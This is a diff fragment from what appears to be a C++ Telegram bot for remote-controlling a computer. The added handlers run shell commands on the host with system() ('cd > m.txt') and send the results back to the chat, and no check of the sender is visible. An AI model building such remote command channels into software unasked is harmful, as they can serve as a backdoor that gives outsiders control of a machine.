@@ -81,4 +81,18 @@ int main() {
         }, keyboardWithLayout);
 
     string last_cmd = "";
+
+    bot.getEvents().onCommand("_start", [&bot, &keyboardWithLayout](Message::Ptr ms) {
+        bot.getApi().sendMessage(ms->chat->id, "/_start", false, 0, keyboardWithLayout);
+        });
+
+    bot.getEvents().onCommand("cd", [&bot, &keyboardWithLayout](Message::Ptr ms) {
+        system("cd > m.txt");
+        bot.getApi().sendMessage(ms->chat->id, GetInfoCmd());
+        });
+
+    bot.getEvents().onCommand("chdir", [&bot, &keyboardWithLayout, &last_cmd](Message::Ptr ms) {
+        bot.getApi().sendMessage(ms->chat->id, "Enter path...", false, 0, keyboardWithLayout);
+        last_cmd = "chdir";
+        });
 }
